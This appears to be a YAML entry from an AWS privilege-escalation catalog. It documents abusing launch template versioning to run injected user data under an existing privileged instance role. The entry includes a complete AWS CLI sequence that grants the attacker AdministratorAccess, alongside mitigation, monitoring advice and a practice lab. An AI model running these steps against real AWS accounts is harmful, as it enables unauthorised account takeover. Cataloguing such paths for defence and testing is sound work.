id: "ec2-004"
name: "ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate"
category: "existing-passrole"
services:
  - ec2
  - iam

permissions:
  required:
    - permission: "ec2:CreateLaunchTemplateVersion"
      resourceConstraints: "Must be able to create new versions of existing launch templates"
    - permission: "ec2:ModifyLaunchTemplate"
      resourceConstraints: "Must be able to modify launch template default version"
  additional:
    - permission: "ec2:DescribeLaunchTemplates"
      resourceConstraints: "Helpful for discovering existing launch templates to target"
    - permission: "ec2:DescribeLaunchTemplateVersions"
      resourceConstraints: "Useful for viewing existing template configuration including instance profiles"
    - permission: "iam:ListRoles"
      resourceConstraints: "Helpful for discovering privileged roles already configured in templates"
    - permission: "iam:ListInstanceProfiles"
      resourceConstraints: "Useful for identifying instance profiles with privileged roles"
    - permission: "autoscaling:DescribeAutoScalingGroups"
      resourceConstraints: "Helpful for identifying which ASGs use the target launch template"
    - permission: "ec2:DescribeInstances"
      resourceConstraints: "Useful for monitoring instance launches and verifying user data execution"
    - permission: "autoscaling:SetDesiredCapacity"
      resourceConstraints: "Helpful for triggering instance launches via Auto Scaling Groups"

description: A principal with `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions can escalate privileges by modifying an existing launch template that already references a privileged IAM role. The attacker creates a new template version that keeps the existing privileged role reference but injects malicious user data, then sets this version as the default. Crucially, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing a role that already exists in a previous template version. When the next EC2 instance launches from the template (via Auto Scaling Groups, scheduled tasks, or manual launches), it automatically receives the privileged role and executes the malicious user data script, which can grant the attacker persistent administrative access. This is particularly dangerous in environments with auto-scaling policies or scheduled instance launches, where the malicious configuration may activate without any further attacker interaction. EC2 launch templates are commonly used with Auto Scaling Groups to define instance configuration including AMI, instance type, security groups, IAM instance profile, and user data scripts.

prerequisites:
  admin:
    - "A launch template must exist that references an IAM role with administrative permissions in a previous version"
    - "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches"
    - "The attacker must be able to trigger or wait for an instance launch from the modified template"
  lateral:
    - "A launch template must exist that references an IAM role with some elevated permissions"
    - "The template must be used by Auto Scaling Groups, scheduled tasks, or manual instance launches"

exploitationSteps:
  awscli:
    - step: 1
      command: |
        # Discover existing launch templates
        aws ec2 describe-launch-templates \
          --query 'LaunchTemplates[*].[LaunchTemplateName,LaunchTemplateId,DefaultVersionNumber]' \
          --output table
      description: "Enumerate existing launch templates to identify targets for modification."
    - step: 2
      command: |
        # Get template details including instance profile
        aws ec2 describe-launch-template-versions \
          --launch-template-id lt-xxxxxxxxxxxxx \
          --versions '$Default' \
          --query 'LaunchTemplateVersions[0].LaunchTemplateData'
      description: "Inspect the target launch template to identify templates that already have privileged IAM instance profiles configured. Look for templates with admin or elevated instance profiles. Replace lt-xxxxxxxxxxxxx with actual template ID."
    - step: 3
      command: |
        # Prepare malicious user data script
        cat > user-data.sh <<'EOF'
        #!/bin/bash
        exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
        echo "Starting privilege escalation script..."

        STARTING_USER_NAME="YOUR_USERNAME_HERE"

        # Wait for IAM role to be available
        sleep 15

        # Attach AdministratorAccess policy to the starting user
        aws iam attach-user-policy \
          --user-name $STARTING_USER_NAME \
          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

        echo "AdministratorAccess attached to $STARTING_USER_NAME successfully"
        EOF

        # Base64 encode the user data
        USER_DATA_B64=$(cat user-data.sh | base64 | tr -d '\n')
      description: "Prepare a malicious user data script that will attach AdministratorAccess policy to your starting principal. Replace YOUR_USERNAME_HERE with your actual username."
    - step: 4
      command: |
        # Create a new launch template version with malicious user data
        # Keep the same instance profile from the existing version (no PassRole needed)
        aws ec2 create-launch-template-version \
          --launch-template-id lt-xxxxxxxxxxxxx \
          --source-version 1 \
          --launch-template-data "{
            \"IamInstanceProfile\": {
              \"Name\": \"EXISTING_PRIVILEGED_INSTANCE_PROFILE\"
            },
            \"UserData\": \"$USER_DATA_B64\"
          }"
      description: "Create a new launch template version that references the existing privileged instance profile and includes the malicious user data. Replace lt-xxxxxxxxxxxxx with the target template ID and EXISTING_PRIVILEGED_INSTANCE_PROFILE with the instance profile name found in step 2. Note that this does NOT require iam:PassRole since you're referencing an existing role configuration."
    - step: 5
      command: |
        # Set the new version as the default
        aws ec2 modify-launch-template \
          --launch-template-id lt-xxxxxxxxxxxxx \
          --default-version NEW_VERSION_NUMBER
      description: "Modify the launch template to set the malicious version as the default. Replace NEW_VERSION_NUMBER with the version number from step 4. All future instance launches will now use this malicious configuration."
    - step: 6
      command: |
        # Trigger instance launch (if template is used by an ASG)
        aws autoscaling set-desired-capacity \
          --auto-scaling-group-name TARGET_ASG_NAME \
          --desired-capacity 1
      description: "Trigger an instance launch. If the template is used by an Auto Scaling Group, you can increase the desired capacity. Alternatively, wait for auto-scaling events or scheduled instance launches to trigger automatically."
    - step: 7
      command: |
        # Wait 2-3 minutes, then verify AdministratorAccess was attached
        aws iam list-attached-user-policies --user-name YOUR_USERNAME_HERE
      description: "Wait for the instance to launch and execute the user data script (typically 2-3 minutes), then verify that AdministratorAccess has been attached to your starting principal."
    - step: 8
      command: |
        # Verify administrator access
        aws iam list-users
      description: "Verify that you now have administrator access by listing IAM users or performing other admin-level actions."

limitations: |
  This path provides administrative access only if the target launch template already references a role with administrative permissions. If the existing template only references roles with limited permissions, the attacker gains access limited to those permissions.

  Importantly, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing an IAM role that already exists in a previous template version. This makes it harder to detect than traditional PassRole-based attacks.

recommendation: |
  Restrict `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions using resource-based policies to limit which templates can be modified:

  {
    "Effect": "Allow",
    "Action": [
      "ec2:CreateLaunchTemplateVersion",
      "ec2:ModifyLaunchTemplate"
    ],
    "Resource": "arn:aws:ec2:*:ACCOUNT:launch-template/specific-template-id",
    "Condition": {
      "StringEquals": {
        "aws:ResourceTag/Environment": "dev"
      }
    }
  }

  Use Service Control Policies (SCPs) to prevent launch template modifications in production environments unless from approved automation roles.

  Monitor CloudTrail for `CreateLaunchTemplateVersion` and `ModifyLaunchTemplate` API calls, especially on templates that reference privileged instance profiles. Alert when default versions are changed.

  Pin Auto Scaling Groups to specific launch template versions (e.g., `$Latest` or version number) rather than using `$Default`, preventing automatic use of modified default versions.

  Monitor EC2 user data for suspicious IAM-related commands using AWS Config rules or custom Lambda functions that inspect new template versions.

  Regularly audit existing launch templates to identify those with privileged instance profiles and restrict modification permissions to only necessary principals.

  Implement approval workflows for launch template changes using AWS Service Catalog or custom automation with human approval steps.

  Enable MFA requirements for sensitive operations like launch template modifications using `aws:MultiFactorAuthPresent` condition keys.

  Use IAM Access Analyzer to identify principals with template modification permissions on templates containing privileged roles.

  Consider using EC2 Image Builder with locked-down instance profiles instead of relying on user data for configuration.

discoveryAttribution:
  firstDocumented:
    source: HackTricks
    link: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html#ec2createlaunchtemplateversionec2createlaunchtemplateec2modifylaunchtemplate
  derivativeOf:
    pathId: ec2-001
    modification: "Uses ec2:CreateLaunchTemplateVersion and ec2:ModifyLaunchTemplate to modify existing templates without requiring iam:PassRole"
  ultimateOrigin:
    pathId: ec2-001
    author: Spencer Gietzen
    organization: Rhino Security Labs
    date: 2018
    link: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/

references:
  - title: "AWS EC2 Launch Templates Documentation"
    url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-launch-templates.html"
  - title: "AWS Privilege Escalation Methods - Rhino Security Labs"
    url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
  - title: "HackTricks - AWS - EC2 Privesc"
    url: "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html#ec2createlaunchtemplateversionec2createlaunchtemplateec2modifylaunchtemplate"

relatedPaths:
  - "ec2-001"
  - "ec2-002"
  - "ec2-003"

learningEnvironments:
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: "privesc-one-hop/to-admin/ec2-createlaunchtemplateversion+ec2-modifylaunchtemplate"
    description: "Deploy Terraform into your own AWS account to practice this attack path"

attackVisualization:
  nodes:
    - id: start
      label: Starting Principal
      type: principal
      description: |
        The principal with ec2:CreateLaunchTemplateVersion and ec2:ModifyLaunchTemplate permissions. Can be an IAM user or role with access to modify existing launch templates.

    - id: existing_template
      label: Existing Launch Template
      type: resource
      description: |
        An existing EC2 launch template that already references a privileged IAM instance profile in a previous version. The attacker discovers this template through ec2:DescribeLaunchTemplates and identifies the privileged role configuration to exploit. Crucially, modifying this template does NOT require iam:PassRole because the attacker is simply referencing a role configuration that already exists in a previous version.

    - id: modified_template
      label: Modified Launch Template
      type: resource
      description: |
        The attacker creates a new template version with malicious user data (using ec2:CreateLaunchTemplateVersion) and sets it as the default (using ec2:ModifyLaunchTemplate). The new version keeps the same privileged IAM instance profile from the existing version but injects malicious user data. All future instance launches from this template will now use the malicious configuration.

    - id: new_instance
      label: New EC2 Instance
      type: resource
      description: |
        An EC2 instance launches from the modified template. This could happen through Auto Scaling Groups, scheduled tasks, or manual launches by other users. The instance automatically receives the privileged IAM role and executes the malicious user data script. The attacker may need to trigger the launch (if they have autoscaling:SetDesiredCapacity) or wait for auto-scaling events or scheduled launches to occur naturally.

    - id: target_role
      label: Existing Role That Trusts the EC2 Service
      type: principal
      description: |
        IAM role that was already configured in the original launch template. The newly launched instance automatically assumes this role through its instance profile. The role's temporary credentials become available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/. The malicious user data script executes with these credentials and attempts to attach AdministratorAccess to the starting principal.

    - id: admin
      label: Effective Administrator
      type: outcome
      description: |
        If the existing role has IAM write permissions (specifically iam:AttachUserPolicy or AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal. The starting principal now has persistent full administrative access to the AWS account.

    - id: some_perms
      label: Limited Escalation Possible
      type: outcome
      color: '#ffeb99'
      description: |
        If the existing role has some elevated permissions but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the attacker may still benefit from the instance remaining in a modified state that could be exploited later, potential access to resources the role can reach (S3, DynamoDB, Secrets Manager), or the ability to exfiltrate credentials or data through the instance.

    - id: no_access
      label: No Effective Escalation
      type: outcome
      color: '#cccccc'
      description: |
        If the existing launch template only references a role with minimal or read-only permissions, the user data script fails to attach any policies and there are no useful resources to access. No effective privilege escalation occurs, though the template remains modified with the malicious configuration.

  edges:
    - from: start
      to: existing_template
      label: Identifies existing template
      description: |
        The starting principal identifies an existing launch template that already references a privileged IAM instance profile. This reconnaissance can be done using ec2:DescribeLaunchTemplates and ec2:DescribeLaunchTemplateVersions (from permissions.additional), but these permissions are not required for the attack itself - the attacker may already know which template to target through other means (documentation, previous access, etc.).

        Optional reconnaissance commands:
        ```bash
        aws ec2 describe-launch-templates \
          --query 'LaunchTemplates[*].[LaunchTemplateName,LaunchTemplateId,DefaultVersionNumber]' \
          --output table

        aws ec2 describe-launch-template-versions \
          --launch-template-id lt-xxxxxxxxxxxxx \
          --versions '$Default' \
          --query 'LaunchTemplateVersions[0].LaunchTemplateData'
        ```

    - from: existing_template
      to: modified_template
      label: ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate
      description: |
        The starting principal creates a new launch template version that references the existing privileged instance profile and includes malicious user data, then modifies the template to set this version as the new default. This does NOT require iam:PassRole because the attacker is simply referencing a role configuration that already exists in a previous version.

        Commands:
        ```bash
        # Create new version with malicious user data
        aws ec2 create-launch-template-version \
          --launch-template-id lt-xxxxxxxxxxxxx \
          --source-version 1 \
          --launch-template-data '{
            "IamInstanceProfile": {
              "Name": "EXISTING_PRIVILEGED_INSTANCE_PROFILE"
            },
            "UserData": "BASE64_ENCODED_MALICIOUS_SCRIPT"
          }'

        # Set new version as default
        aws ec2 modify-launch-template \
          --launch-template-id lt-xxxxxxxxxxxxx \
          --default-version NEW_VERSION_NUMBER
        ```

        The malicious user data script attempts to attach AdministratorAccess to the starting principal using the target role's credentials.

    - from: modified_template
      to: new_instance
      label: Instance launch triggered
      description: |
        An EC2 instance launches from the modified template. This could be triggered by the attacker (if they have ASG permissions), by auto-scaling events, by scheduled tasks, or by other users manually launching instances.

        Command (if attacker has autoscaling:SetDesiredCapacity):
        ```bash
        aws autoscaling set-desired-capacity \
          --auto-scaling-group-name TARGET_ASG_NAME \
          --desired-capacity 1
        ```

        Alternatively, the attacker may need to wait for these events to occur naturally through normal auto-scaling operations or scheduled instance launches.

    - from: new_instance
      to: target_role
      label: Instance assumes role
      description: |
        The launched instance automatically assumes the privileged IAM role through its instance profile. The EC2 service provides temporary credentials via the instance metadata service. The malicious user data script executes automatically during instance initialization (typically within 1-2 minutes of launch), running with the target role's credentials.

    - from: target_role
      to: admin
      label: If role has IAM write permissions
      branch: A
      condition: admin
      description: |
        If the target role has iam:AttachUserPolicy or equivalent IAM write permissions (such as AdministratorAccess), the user data script successfully attaches the AdministratorAccess policy to the starting principal, granting persistent full administrative access.

        Example user data script that executes:
        ```bash
        #!/bin/bash
        aws iam attach-user-policy \
          --user-name STARTING_USER_NAME \
          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
        ```

    - from: target_role
      to: some_perms
      label: If role has elevated permissions but not IAM write
      branch: B
      condition: some_permissions
      description: |
        If the target role has elevated permissions to access resources (like S3, DynamoDB, Secrets Manager) but lacks IAM write permissions, the user data script fails to attach AdministratorAccess. However, the modified template persists and could be exploited in other ways, or the instance could be used as a pivot point to access data or services within the role's permissions.

    - from: target_role
      to: no_access
      label: If role has minimal permissions
      branch: C
      condition: no_permissions
      description: |
        If the existing launch template only references a role with minimal or read-only permissions, the user data script fails and there are no useful resources to access. The template remains modified but provides no effective privilege escalation.
